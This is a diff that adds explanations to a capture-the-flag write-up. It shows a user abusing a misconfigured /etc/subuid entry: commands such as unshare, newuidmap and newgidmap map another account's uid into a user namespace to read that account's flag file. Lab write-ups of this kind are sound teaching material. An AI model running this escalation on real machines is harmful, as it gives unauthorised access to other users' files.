@@ -1,7 +1,18 @@
 # subuser write-up
 
 ## connect through ssh with simpleuser account
-## Notice vulnerable subuid and subgid configuration
+
+## identify there are two interesting users on the machine.
+
+```
+$ cat /etc/passwd | tail -2
+simpleuser:x:1000:1000::/home/simpleuser:/bin/bash
+flaguser:x:1001:1001::/home/flaguser:/bin/bash
+```
+
+One user is called `flaguser`. Its uid and gid are 1001/1001.
+
+## notice vulnerable subuid and subgid configuration
 
 ```
 [simpleuser@6304f11c4fca ~]$ cat /etc/subuid
@@ -13,6 +24,8 @@ simpleuser:524288:65536
 flaguser:589824:65536
 simpleuser:1001:1
 ```
+
+Lines `simpleuser:1001:1` mean that simpleuser can create a new user namespace, and map uid/gid inside the user namespace to uid/gid 1001 outside the namespace, corresponding to flaguser uid/gid.
 
 ## use unshare to create a new user namespace and display PID
 
@@ -31,6 +44,8 @@ usage: newuidmap [<pid>|fd:<pidfd>] <uid> <loweruid> <count> [ <uid> <loweruid> 
 [simpleuser@6304f11c4fca ~]$ newuidmap 46 0 1000 1 1 1001 1
 [simpleuser@6304f11c4fca ~]$ newgidmap 46 0 1000 1 1 1001 1
 ```
+
+These commands will map, for user namespace of PID 46, uid/gid 0 inside the namespace to 1000 outside, and uid/gid 1 inside the namespace to 1001 outside.
 
 ## on previous session, search and display flag
 
@@ -53,6 +68,8 @@ drwxr-xr-x. 1 nobody nobody  16 Sep 16 12:03 ..
 Congrats, here is the flag: FLAG
 € 
 ```
+
+Notice that the user/group simpleuser (uid/gid 1000) and flaguser (uid/gid 1001) appears as root (uid/gid 0) and bin (uid/gid 1) when inside the user namespace.
 
 # sources
 
